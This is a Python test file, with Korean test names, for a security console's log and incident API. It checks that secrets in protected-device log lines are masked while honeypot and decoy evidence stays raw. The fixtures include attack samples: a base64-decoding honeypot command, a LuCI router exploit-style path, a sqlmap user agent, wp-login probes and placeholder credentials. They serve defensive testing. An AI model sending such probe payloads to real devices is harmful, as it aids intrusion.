        return {"line_hash": line_hash, "ts": ts, "eventid": eventid, "src_ip": "203.0.113.7", "src_port": 51234,
                "http_method": "GET", "url": "/", "http_status": 200, "user_agent": "curl/8.5.0", "username": None,
                "has_password": False, "message": None}

    def test_줄_id_는_32자_16진이고_같은_줄은_같은_id_다(self):
        key = nl.line_id_key("비밀-가")
        a, b = hashlib.sha1(b"a").hexdigest(), hashlib.sha1(b"b").hexdigest()
        self.assertRegex(nl.line_id(a, key), r"^[0-9a-f]{32}$")
        self.assertEqual(nl.line_id(a, key), nl.line_id(a, nl.line_id_key("비밀-가")))
        self.assertNotEqual(nl.line_id(a, key), nl.line_id(b, key))
        self.assertNotEqual(nl.line_id(a, key), nl.line_id(a, nl.line_id_key("비밀-나")))
        self.assertNotIn(nl.line_id(a, key), a)
        self.assertEqual(nl.line_id_key(), nl.line_id_key(nl.auth.SECRET))

    def test_시각은_고정_자릿수이고_ts_id_내림차순이다(self):
        kst = timezone(timedelta(hours=9))
        rows = [self.row(hashlib.sha1(str(i).encode()).hexdigest(), ts) for i, ts in enumerate([
            NOW.replace(microsecond=0), NOW.replace(microsecond=0), datetime(2026, 9, 28, 11, 59, tzinfo=kst),
            NOW + timedelta(microseconds=5)])]
        items = nl.line_items(rows, nl.line_id_key("시험"))
        self.assertEqual([x["ts"] for x in items],
                         ["2026-09-28T03:00:00.000005+00:00", "2026-09-28T03:00:00.000000+00:00",
                          "2026-09-28T03:00:00.000000+00:00", "2026-09-28T02:59:00.000000+00:00"])
        self.assertEqual(items, sorted(items, key=lambda x: (x["ts"], x["id"]), reverse=True))
        self.assertGreater(items[1]["id"], items[2]["id"])
        self.assertEqual(set(items[0]), {"id", "ts", "kind", "eventid", "src_ip", "src_port", "http_method", "url",
                                         "http_status", "user_agent", "username", "has_password", "message"})
        self.assertEqual([nl.line_kind(e) for e in ("nginx.request", "sshd.login.failed")], ["web", "ssh"])


# ----------------------------------------------------------------------
#  4. 라우터
# ----------------------------------------------------------------------

LINE_HASHES = [hashlib.sha1(f"line-{i}".encode()).hexdigest() for i in range(3)]


class FakeConn:
    """가짜 DB. 표 · 권한이 하나도 없는 DB 가 기본이고, 하위 클래스가 질의별 답을 정한다. calls 에 질의를 남긴다."""
    readable = False     # targets.NODES_READABLE_SQL
    node_rows = []       # targets.NODES_SQL
    times = None         # nl.NODE_TIMES_SQL
    lines = []           # 줄 조회
    future = 0
    paths = []           # targets.DETECT_PATHS_SQL
    specs = []           # targets.RULES_SQL

    def __init__(self, calls):
        self.calls = calls

    async def fetchval(self, sql, *args):
        self.calls.append(sql)
        if sql == "SELECT now()":
            return NOW
        if sql == t.NODES_READABLE_SQL:
            return self.readable
        if "SELECT count(*) FROM (SELECT 1 FROM events e" in sql:
            return self.future
        return None

    async def fetchrow(self, sql, *args):
        self.calls.append(sql)
        return self.times if sql == nl.NODE_TIMES_SQL else None

    async def fetch(self, sql, *args):
        self.calls.append(sql)
        if sql == t.NODES_SQL:
            return self.node_rows
        if sql == t.DETECT_PATHS_SQL:
            return self.paths
        if sql == t.RULES_SQL:
            return self.specs
        if "ORDER BY e.ts DESC, e.line_hash DESC" in sql:
            return self.lines
        return []

    @asynccontextmanager
    async def transaction(self, **kw):
        self.calls.append(("transaction", kw))
        yield


class FullConn(FakeConn):
    """운영 콘솔처럼 nodes 를 열 권한으로 읽고, 줄 · 탐지 실행이 있는 DB."""
    readable = True
    node_rows = [node_row("web-02", hostname="web02.lab", sensor="web-02")]
    times = {"logs": ["nginx", "auth", "metrics"], "last_loaded_at": NOW - timedelta(seconds=24),
             "receipt": json.dumps({"nginx": {"last_line_at": "2026-09-28T02:59:40.120000+00:00"}})}
    lines = [
        {"line_hash": LINE_HASHES[0], "ts": NOW - timedelta(seconds=30), "eventid": "nginx.request",
         "src_ip": "203.0.113.7", "src_port": 51234, "http_method": "GET",
         "url": "/login?user=admin&password=hunter2", "http_status": 200,
         "user_agent": "Authorization: Bearer abcDEF123456", "username": None, "has_password": False, "message": None},
        {"line_hash": LINE_HASHES[1], "ts": NOW - timedelta(seconds=60), "eventid": "sshd.login.failed",
         "src_ip": "198.51.100.9", "src_port": 40022, "http_method": None, "url": None, "http_status": None,
         "user_agent": None, "username": "root", "has_password": True,
         "message": "Failed password for root from 198.51.100.9 port 40022 ssh2"},
    ]
    future = 2


class RouterTests(unittest.TestCase):
    def setUp(self):
        import test_web  # asyncpg 가 없는 곳에서 가짜를 넣는다(main 보다 먼저)
        self.main, self.auth = test_web.main, test_web.auth
        self.pool = FakePool()
        patcher = patch.object(self.main.app.state, "pool", self.pool, create=True)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.accounts = test_web.FakeAccounts().patch(self)
        self.account_row = test_web.account_row
        self.client = TestClient(self.main.app, follow_redirects=False)
        self.addCleanup(self.client.close)
        honeypot, specs = rule_rows(bridge_files())
        FullConn.paths = [{"rule_version": v, "last_at": NOW - timedelta(minutes=1), "honeypot": False}
                          for v in sorted(honeypot)]
        FullConn.specs = specs

    def login(self, role="viewer"):
        self.accounts["han"] = self.account_row(role)
        self.client.cookies.set(self.auth.COOKIE, self.auth.issue("han", role))

    def queries(self):
        return [c for c in self.pool.calls if isinstance(c, str)]

    def test_경로는_로그_처리기로_간다(self):
        from starlette.routing import Match
        scope = {"type": "http", "path": "/api/devices/web-01/logs", "method": "GET", "root_path": "", "headers": []}
        route = next(r for r in self.main.app.routes if r.matches(scope)[0] == Match.FULL)
        self.assertIs(route.endpoint, nl.device_logs)

    def test_세션이_없으면_401_이고_DB_와_계정을_보지_않는다(self):
        response = self.client.get("/api/devices/web-01/logs")
        self.assertEqual((response.status_code, response.json()), (401, {"detail": "인증이 필요합니다"}))
        self.assertEqual((self.pool.calls, self.accounts.calls), ([], []))

    def test_입력_오류는_422_이고_풀을_빌리지_않는다(self):
        self.login()
        for params in ({"kind": "http"}, {"kind": ""}, {"status": "99"}, {"status": "600"}, {"status": "1a"},
                       {"limit": "0"}, {"limit": "201"}):
            with self.subTest(params=params):
                self.assertEqual(self.client.get("/api/devices/web-01/logs", params=params).status_code, 422)
        for src_ip in ("abc", "fe80::1%eth0", "1.2.3.4\x00", "1" * 65, " " * 60 + "1.2.3.4"):
            with self.subTest(src_ip=src_ip):
                response = self.client.get("/api/devices/web-01/logs", params={"src_ip": src_ip})
                # 화면이 msg 를 그대로 보이므로 한국어 한 문장이다(FastAPI 검증 msg 는 영어다)
                self.assertEqual((response.status_code, response.json()), (422, {"detail": "src_ip 는 IP 주소여야 합니다"}))
        self.assertEqual(self.pool.calls, [])

    def test_형식_밖_장비_id_는_404_이고_풀을_빌리지_않는다(self):
        self.login()
        for raw in ("WEB-01", "_unconfirmed", "a" * 65, "web%00", "web-01%0A", "web_01"):
            with self.subTest(device=raw):
                response = self.client.get(f"/api/devices/{raw}/logs")
                self.assertEqual((response.status_code, response.json()), (404, {"detail": nl.NOT_FOUND}))
        self.assertEqual(self.pool.calls, [])

    def test_보호_대상이_아니면_같은_404_이고_질의_3개로_끝난다(self):
        self.pool.conn = FullConn
        self.login()
        for device in ("aws-sensor", "console", "data-node", "web-09", "probe-01"):
            with self.subTest(device=device):
                self.pool.calls.clear()
                response = self.client.get(f"/api/devices/{device}/logs")
                self.assertEqual((response.status_code, response.json()), (404, {"detail": nl.NOT_FOUND}))
                self.assertEqual(self.queries(), ["SELECT now()", t.NODES_READABLE_SQL, t.NODES_SQL])

    def test_viewer_는_200_이고_nodes_를_읽을_수_없으면_web_01_시각은_모름이다(self):
        self.login("viewer")
        response = self.client.get("/api/devices/web-01/logs")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.headers["cache-control"], "no-store")    # /api 라 저절로 붙는다(web.py)
        body = response.json()
        self.assertEqual(body["device"], {"id": "web-01", "label": "web-01", "kind": "fixed"})
        self.assertEqual(body["times"]["state"], "unreadable")
        self.assertIsNone(body["times"]["loaded_at"])
        self.assertEqual([(x["declared"], x["last_line_at"]) for x in body["times"]["lines"]], [(None, None)] * 2)
        self.assertEqual(body["times"]["detect"],
                         {"last_at": None, "stale": True, "reason": "24시간 안 실행 기록 없음", "versions": []})
        self.assertEqual((body["items"], body["future"]), ([], 0))
        self.assertNotIn(nl.NODE_TIMES_SQL, self.pool.calls)
        self.assertNotIn(t.RULES_SQL, self.pool.calls, "1분 다리 버전이 없으면 규칙 정의를 읽지 않는다")
        # nodes 를 읽을 수 없으면 등록 노드는 확인되지 않는다
        self.assertEqual(self.client.get("/api/devices/web-02/logs").status_code, 404)

    def test_한_트랜잭션에서_질의_9개로_답한다(self):
        self.pool.conn = FullConn
        for role in ("viewer", "operator", "admin"):
            with self.subTest(role=role):
                self.pool.calls.clear()
                self.login(role)
                response = self.client.get("/api/devices/web-02/logs", params={"kind": "web", "src_ip": " 203.0.113.7 ",
                                                                               "status": "200", "limit": "50"})
                self.assertEqual(response.status_code, 200)
                self.assertEqual([c for c in self.pool.calls if isinstance(c, tuple)],
                                 [("transaction", {"isolation": "repeatable_read", "readonly": True})])
                self.assertEqual(len(self.queries()), 9)
                self.assertIn(t.RULES_SQL, self.pool.calls)
        body = response.json()
        self.assertEqual(body["device"], {"id": "web-02", "label": "web02.lab", "kind": "node"})
        self.assertEqual((body["limit"], body["window_days"], body["future"]), (50, 7, 2))
        self.assertEqual(body["filters"], {"kind": "web", "src_ip": "203.0.113.7", "status": 200})
        self.assertEqual(body["kinds"], [{"key": "web", "label": "웹 접근"}, {"key": "ssh", "label": "SSH 인증"}])
        times = body["times"]
        self.assertEqual((times["state"], times["loaded_at"]), ("ok", (NOW - timedelta(seconds=24)).isoformat()))
        self.assertEqual(times["lines"], [
            {"key": "web", "job": "nginx", "label": "웹 접근", "declared": True,
             "last_line_at": "2026-09-28T02:59:40.120000+00:00"},
            {"key": "ssh", "job": "auth", "label": "SSH 인증", "declared": True, "last_line_at": None}])
        self.assertEqual([v["rule_version"] for v in times["detect"]["versions"]], ["c1", "sg1", "w2"])
        self.assertNotIn("label", times["detect"])

    def test_줄은_가려지고_line_hash_는_응답에_없다(self):
        self.pool.conn = FullConn
        self.login()
        response = self.client.get("/api/devices/web-01/logs")
        body = response.json()
        for line_hash in LINE_HASHES:
            self.assertNotIn(line_hash, response.text)
        self.assertNotIn("hunter2", response.text)
        self.assertNotIn("abcDEF123456", response.text)
        web, ssh = body["items"]
        self.assertRegex(web["id"], r"^[0-9a-f]{32}$")
        self.assertEqual(web["id"], nl.line_id(LINE_HASHES[0], nl.line_id_key()))
        self.assertEqual((web["kind"], web["url"], web["user_agent"], web["ts"]),
                         ("web", "/login?user=…&password=…", f"Authorization: {M}", "2026-09-28T02:59:30.000000+00:00"))
        self.assertEqual((ssh["kind"], ssh["username"], ssh["has_password"], ssh["http_status"]),
                         ("ssh", "root", True, None))
        # 두 번 받아도 같은 줄은 같은 id 다(화면이 합친다)
        again = self.client.get("/api/devices/web-01/logs").json()
        self.assertEqual([x["id"] for x in again["items"]], [x["id"] for x in body["items"]])


class FakePool:
    def __init__(self, conn=FakeConn):
        self.calls, self.conn = [], conn

    @asynccontextmanager
    async def acquire(self):
        yield self.conn(self.calls)


# ----------------------------------------------------------------------
#  5. 사건 상세(① 근거 표본 · ② 행위 · ④ 원문)의 보호 대상 장비 줄
# ----------------------------------------------------------------------

ACTOR = "203.0.113.50"
SECRET_INPUT = "echo cGFzc3dvcmQ9aHVudGVyMg== | base64 -d; passwd=hunter2"     # 허니팟 명령(공격 증거)


def behavior_row(sensor, eventid, **cols):
    """main.get_incident ② 행위 한 행과 같은 열(user_agent · message 가 없다)."""
    return {"ts": NOW - timedelta(seconds=30), "sensor": sensor, "eventid": eventid, "session": None, "username": None,
            "input": None, "url": None, "shasum": None, "http_method": None, "http_status": None, **cols}


def raw_row(sensor, eventid, **cols):
    """main.get_incident ④ 원문 한 행과 같은 열(password 는 있었는지만)."""
    return {"ts": NOW - timedelta(seconds=30), "sensor": sensor, "eventid": eventid, "session": None, "username": None,
            "has_password": False, "input": None, "url": None, "shasum": None, "http_method": None, "http_status": None,
            "user_agent": None, "message": None, **cols}


# 같은 사건(같은 출발지 · 구간)에 보호 대상 줄과 허니팟 · 그 밖의 발생원 줄이 섞인 ② · ④. 앞의 것이 보호 대상(web-01 · 카드 web-02)이다
BEHAVIOR = [
    behavior_row("web-01", "sshd.login.success", session="web-01/sshd/77", username=HEX_USER),
    behavior_row("cowrie", "cowrie.command.input", session="c0ffee", username="root", input=SECRET_INPUT),
    behavior_row("decoy", "decoy.action.login", url="/login?password=hunter2", username="admin"),
]
RAW = [
    raw_row("web-01", "nginx.request", http_method="GET", url="/login?user=admin&password=hunter2", http_status=200,
            user_agent="Authorization: Bearer abcDEF123456", has_password=True),
    raw_row("web-02", "sshd.login.failed", session="web-02/sshd/4242", username=HEX_USER,
            message=f"Failed password for invalid user {HEX_USER} from {ACTOR} port 40022 ssh2"),
    raw_row("cowrie", "cowrie.command.input", session="c0ffee", username="root", input=SECRET_INPUT),
    raw_row("cowrie", "cowrie.login.failed", session="c0ffee", username="root", has_password=True,
            message="login attempt [root/hunter2] failed"),
    raw_row("decoy", "decoy.request", http_method="GET", url="/wp-login.php?pwd=hunter2&token=abc123", http_status=404,
            user_agent="sqlmap token=abc123"),
    raw_row("gateway", "gateway.denied", input="in=eth0 out= dst=10.0.0.1", message=f"deny token={HEX32}"),
    raw_row("console", "console.login.failed", username="admin", url="/api/login?password=hunter2"),
    raw_row("audit", "console.block.released", input=f"token={JWT}"),
    raw_row("collector", "collector.agent.rejected", username="web-09", input="reason=bad_token secret=hunter2"),
    raw_row("web-03", "nginx.request", url="/a?token=abc123"),        # 발생원이 겹친 노드: 카드가 없다(한계)
]
PROTECTED = {"web-01", "web-02"}


def signature_sample(sensor, eventid, url, method="GET", status=404):
    """요청 경로 서명 규칙의 근거 표본 한 항목(detect.signals_url_signature 의 신호 detail 모양 그대로)."""
    return {"eventid": eventid, "sensor": sensor, "http_method": method, "url": url, "http_status": status,
            "signatures": ["sg-luci"]}


# 요청 경로 서명 사건(R107 · sg1)의 근거. 앞의 web-01 표본은 ④ 에도 같은 줄이 있다. 보호 대상 줄의 비밀은 WEB_SECRET 으로 따로
# 둬 디코이 줄(hunter2, 원문 그대로)과 섞이지 않게 응답 전체에서 센다
WEB_SECRET = "webS3cret99"
SIG_URL = f"/cgi-bin/luci/;stok=/locale?form=country&password={WEB_SECRET}&token={JWT}"
EVIDENCE = {"sample": [signature_sample("web-01", "nginx.request", SIG_URL),
                       signature_sample("decoy", "decoy.request", "/cgi-bin/luci/;stok=/locale?password=hunter2"),
                       signature_sample("web-02", "nginx.request", f"/reset/{HEX32}?pw={WEB_SECRET}"),
                       signature_sample("web-03", "nginx.request", "/a?token=abc123")],     # 카드가 없는 노드(한계)
            "sessions": [], "signatures": ["sg-luci"], "sensors": ["decoy", "web-01", "web-02", "web-03"]}
SIG_WEB_URL = "/cgi-bin/luci/;stok=/locale?form=…&password=…&token=…"


class IncidentLineTests(unittest.TestCase):
    def test_보호_대상_id_는_목록_화면과_같다(self):
        self.assertEqual(nl.protected_ids(CARDS), {"web-01", "web-02", "web-04"})
        self.assertEqual(nl.protected_ids([]), {"web-01"})
        for device in ("web-01", "web-02", "web-03", "probe-01", "aws-sensor"):
            with self.subTest(device=device):
                self.assertEqual(device in nl.protected_ids(CARDS), nl.protected_device(device, CARDS) is not None)
        # 허니팟 · 관제 발생원 이름은 노드 id 로 쓸 수 없어 카드가 되지 않는다(원문 그대로 남는 까닭)
        import operations
        self.assertLessEqual(set(t.SENSOR_TARGET) - {t.WEB_NODE}, operations.RESERVED)

    def test_보호_대상_줄만_가리고_허니팟_디코이_관문_줄은_원문이다(self):
        for name, rows in (("② 행위", BEHAVIOR), ("④ 원문", RAW)):
            got = nl.mask_incident_lines(rows, CARDS)
            self.assertEqual([(r["sensor"], r["eventid"]) for r in got], [(r["sensor"], r["eventid"]) for r in rows])
            for before, after in zip(rows, got):
                with self.subTest(section=name, sensor=before["sensor"], eventid=before["eventid"]):
                    self.assertEqual(set(after), set(before), "칸이 늘거나 줄지 않는다")
                    if before["sensor"] in PROTECTED:
                        self.assertEqual(after, nl.mask_event(before))
                        self.assertNotEqual(after, before)
                        self.assertNotIn("hunter2", json.dumps(after, default=str))
                        self.assertNotIn(HEX_USER, json.dumps(after, default=str))
                    else:
                        self.assertIs(after, before)
        web, node = nl.mask_incident_lines(RAW, CARDS)[:2]
        self.assertEqual((web["url"], web["user_agent"], web["http_method"], web["has_password"]),
                         ("/login?user=…&password=…", f"Authorization: {M}", "GET", True))
        self.assertEqual((node["username"], node["session"], node["message"]),
                         (M, "web-02/sshd/4242", f"Failed password for invalid user {M} from {ACTOR} port 40022 ssh2"))
        [ssh] = nl.mask_incident_lines(BEHAVIOR[:1], CARDS)
        self.assertEqual((ssh["username"], ssh["session"]), (M, "web-01/sshd/77"))
        # 원문 행은 바꾸지 않는다(새 행을 만든다)
        self.assertEqual((RAW[0]["url"], BEHAVIOR[0]["username"]), ("/login?user=admin&password=hunter2", HEX_USER))

    def test_nodes_를_읽을_수_없으면_web_01_만_가린다(self):
        got = nl.mask_incident_lines(RAW[:2], [])
        self.assertEqual(got[0]["url"], "/login?user=…&password=…")
        self.assertIs(got[1], RAW[1])       # 등록 노드는 확인되지 않는다(목록 화면이 404 인 것과 같다)

    def test_상세와_목록은_같은_가림이다(self):
        row = {"http_method": "token=hunter2", "url": f"/reset/{HEX32}?password=hunter2",
               "user_agent": f"x Bearer abcDEF123456 {B64}", "username": f"pw=hunter2 {B64}",
               "message": f"Accepted publickey for root from {ACTOR} port 22 ssh2: ED25519 SHA256:{FP}", "input": None}
        masked = nl.mask_event({**row, "sensor": "web-01"})
        self.assertEqual({k: masked[k] for k in nl.CLIP}, nl.mask_row(row))
        self.assertTrue(masked["message"].endswith(f"SHA256:{FP}"), "키 지문 예외도 같다")
        # 목록에 없는 input 칸도 같은 글자 가림이다
        self.assertEqual(nl.mask_event({"input": "passwd=hunter2 x"})["input"], f"passwd={M} x")
        self.assertEqual(nl.mask_event({"sensor": "web-01"}), {"sensor": "web-01"})

    def test_근거_표본은_보호_대상_항목만_가리고_디코이_표본은_원문이다(self):
        # 표본에 다른 규칙의 detail(글자 · 건수)과 모양이 틀린 항목(발생원이 목록 · 칸 값이 글자가 아님)도 섞는다
        odd = ["/geoserver/web/?token=abc123", {"count": 12, "window_seconds": 60, "threshold": 10},
               {"sensor": ["web-01"], "url": "/x?password=hunter2"},
               {"sensor": "web-01", "url": [f"/x?password={WEB_SECRET}"], "http_method": 7, "http_status": 404}]
        evidence = {**EVIDENCE, "sample": EVIDENCE["sample"] + odd, "observed_count_max": 3}
        got = nl.mask_evidence(evidence, CARDS)
        self.assertEqual({k: v for k, v in got.items() if k != "sample"},
                         {k: v for k, v in evidence.items() if k != "sample"}, "표본 밖 칸은 그대로다")
        self.assertEqual(len(got["sample"]), len(evidence["sample"]))
        for before, after in zip(evidence["sample"], got["sample"]):
            mine = isinstance(before, dict) and isinstance(before.get("sensor"), str) and before["sensor"] in PROTECTED
            with self.subTest(sample=str(before)[:40]):
                if mine:
                    self.assertEqual(after, nl.mask_event(before))
                    self.assertNotEqual(after, before)
                else:
                    self.assertIs(after, before)
        web, decoy, node, uncarded, *_, weird = got["sample"]
        self.assertEqual(web, {**EVIDENCE["sample"][0], "url": SIG_WEB_URL})
        self.assertEqual(node["url"], f"/reset/{M}?pw=…")
        self.assertEqual(decoy["url"], "/cgi-bin/luci/;stok=/locale?password=hunter2")
        self.assertEqual(uncarded["url"], "/a?token=abc123")
        self.assertEqual((weird["url"], weird["http_method"], weird["http_status"]), (M, M, 404))
        text = json.dumps(got, ensure_ascii=False)
        for secret in (WEB_SECRET, JWT, HEX32):
            self.assertNotIn(secret, text)
        # 원래 근거는 바꾸지 않는다(새 근거를 만든다)
        self.assertEqual(evidence["sample"][0]["url"], SIG_URL)
        # nodes 를 읽을 수 없으면 web-01 표본만 가린다
        unread = nl.mask_evidence(EVIDENCE, [])["sample"]
        self.assertEqual(unread[0]["url"], SIG_WEB_URL)
        self.assertIs(unread[2], EVIDENCE["sample"][2])
        # 근거가 없거나 모양이 다르면 받은 것 그대로다
        for value in (None, [], "x", {"sessions": []}, {"sample": "x"}, {"sample": None}):
            with self.subTest(evidence=value):
                self.assertIs(nl.mask_evidence(value, CARDS), value)


INCIDENT = {"incident_key": f"R102|w2|{ACTOR}|t", "rule_id": "R102", "rule_version": "w2", "rule_name": "시험 규칙",
            "severity": "medium", "actor_ip": ACTOR, "target": None, "first_ts": NOW - timedelta(minutes=2),
            "last_ts": NOW - timedelta(minutes=1), "signal_count": 5, "session_count": 0, "evidence": None,
            "status": "open", "created_at": NOW}


class DetailConn:
    """사건 상세(main.get_incident)용 가짜 DB. 사건 하나와 ② · ④ 행을 주고 나머지는 비었다. calls 에 질의를 남긴다."""
    readable = True
    node_rows = [node_row("web-02", hostname="web02.lab")]       # 등록 절차처럼 발생원은 node_id 다
    behavior = BEHAVIOR
    raw = RAW

    def __init__(self, calls):
        self.calls = calls

    async def fetchrow(self, sql, *args):
        self.calls.append(sql)
        return INCIDENT if "FROM incidents WHERE incident_key" in sql else None

    async def fetchval(self, sql, *args):
        self.calls.append(sql)
        if sql == "SELECT now()":
            return NOW
        return self.readable if sql == t.NODES_READABLE_SQL else None

    async def fetch(self, sql, *args):
        self.calls.append(sql)
        if sql == t.NODES_SQL:
            return self.node_rows
        if "ORDER BY ts LIMIT 200" in sql:
            return self.behavior
        if "ORDER BY ts LIMIT 300" in sql:
            return self.raw
        return []


class UnreadableDetailConn(DetailConn):
    readable = False


SIG_INCIDENT = {**INCIDENT, "incident_key": f"R107|sg1|{ACTOR}|t", "rule_id": "R107", "rule_version": "sg1",
                "evidence": json.dumps(EVIDENCE)}


class SignatureDetailConn(DetailConn):
    """요청 경로 서명 사건(R107 · sg1). 근거 표본(asyncpg 가 jsonb 를 글자로 주는 꼴)과 ④ 에 같은 web-01 · 디코이 요청이 있다."""
    behavior = []
    raw = [raw_row("web-01", "nginx.request", http_method="GET", url=SIG_URL, http_status=404),
           raw_row("decoy", "decoy.request", http_method="GET", url="/cgi-bin/luci/;stok=/locale?password=hunter2",
                   http_status=404)]

    async def fetchrow(self, sql, *args):
        self.calls.append(sql)
        return SIG_INCIDENT if "FROM incidents WHERE incident_key" in sql else None


class IncidentDetailTests(unittest.TestCase):
    def setUp(self):
        import test_web  # asyncpg 가 없는 곳에서 가짜를 넣는다(main 보다 먼저)
        self.main = test_web.main

    def detail(self, conn=DetailConn):
        pool = FakePool(conn)
        with patch.object(self.main.app.state, "pool", pool, create=True):
            return asyncio.run(self.main.get_incident(INCIDENT["incident_key"])), pool.calls

    def test_보호_대상_줄은_가리고_허니팟_줄은_원문이다(self):
        body, calls = self.detail()
        for key, rows in (("behavior", BEHAVIOR), ("raw", RAW)):
            self.assertEqual(len(body[key]), len(rows))
            for before, after in zip(rows, body[key]):
                plain = self.main.row_to_dict(before)
                with self.subTest(section=key, sensor=before["sensor"], eventid=before["eventid"]):
                    self.assertEqual(after, nl.mask_event(plain) if before["sensor"] in PROTECTED else plain)
        web, node, cowrie, cowrie_login, decoy = body["raw"][:5]
        self.assertEqual((web["url"], web["user_agent"], web["has_password"]),
                         ("/login?user=…&password=…", f"Authorization: {M}", True))
        self.assertEqual(node["username"], M)
        self.assertEqual((cowrie["input"], cowrie_login["message"], cowrie_login["has_password"]),
                         (SECRET_INPUT, "login attempt [root/hunter2] failed", True))
        self.assertEqual((decoy["url"], decoy["user_agent"]), ("/wp-login.php?pwd=hunter2&token=abc123", "sqlmap token=abc123"))
        self.assertEqual([r["username"] for r in body["behavior"]], [M, "root", "admin"])
        self.assertEqual(body["behavior"][2]["url"], "/login?password=hunter2")
        # 보호 대상 줄의 글자에는 비밀이 없다. password 원문 칸은 여전히 없다
        protected = [r for r in body["behavior"] + body["raw"] if r["sensor"] in PROTECTED]
        text = json.dumps(protected, ensure_ascii=False)
        for secret in ("hunter2", "abcDEF123456", HEX_USER):
            self.assertNotIn(secret, text)
        self.assertTrue(all("password" not in r for r in body["raw"]))
        # 카드는 관련 장비 계산이 읽은 것을 쓴다(nodes 질의가 늘지 않는다)
        self.assertEqual((calls.count(t.NODES_READABLE_SQL), calls.count(t.NODES_SQL)), (1, 1))

    def test_nodes_를_읽을_수_없으면_web_01_줄만_가린다(self):
        body, calls = self.detail(UnreadableDetailConn)
        self.assertEqual(body["raw"][0]["url"], "/login?user=…&password=…")
        self.assertEqual(body["raw"][1], self.main.row_to_dict(RAW[1]))
        self.assertNotIn(t.NODES_SQL, calls)

    def test_서명_사건의_근거_표본도_보호_대상은_가리고_디코이는_원문이다(self):
        body, calls = self.detail(SignatureDetailConn)
        web, decoy, node, uncarded = body["evidence"]["sample"]
        # ① 과 ④ 가 같은 web-01 요청을 같은 가린 값으로 보인다
        self.assertEqual(web["url"], SIG_WEB_URL)
        self.assertEqual(web["url"], body["raw"][0]["url"])
        self.assertEqual((web["sensor"], web["http_method"], web["http_status"], web["signatures"]),
                         ("web-01", "GET", 404, ["sg-luci"]))
        self.assertEqual(node["url"], f"/reset/{M}?pw=…")
        # 디코이 표본 · ④ 줄은 공격 증거라 원문, 카드가 없는 노드 표본은 확인되지 않아 그대로다(한계)
        self.assertEqual(decoy, EVIDENCE["sample"][1])
        self.assertEqual(body["raw"][1]["url"], "/cgi-bin/luci/;stok=/locale?password=hunter2")
        self.assertEqual(uncarded, EVIDENCE["sample"][3])
        self.assertEqual({k: body["evidence"][k] for k in ("sessions", "signatures", "sensors")},
                         {k: EVIDENCE[k] for k in ("sessions", "signatures", "sensors")})
        # 응답 어디에도 보호 대상 줄의 비밀이 없다(고치기 전에는 ① 에 원문이 남았다)
        text = json.dumps(body, ensure_ascii=False, default=str)
        for secret in (WEB_SECRET, JWT, HEX32):
            self.assertNotIn(secret, text)
        self.assertEqual((calls.count(t.NODES_READABLE_SQL), calls.count(t.NODES_SQL)), (1, 1))


if __name__ == "__main__":
    unittest.main()
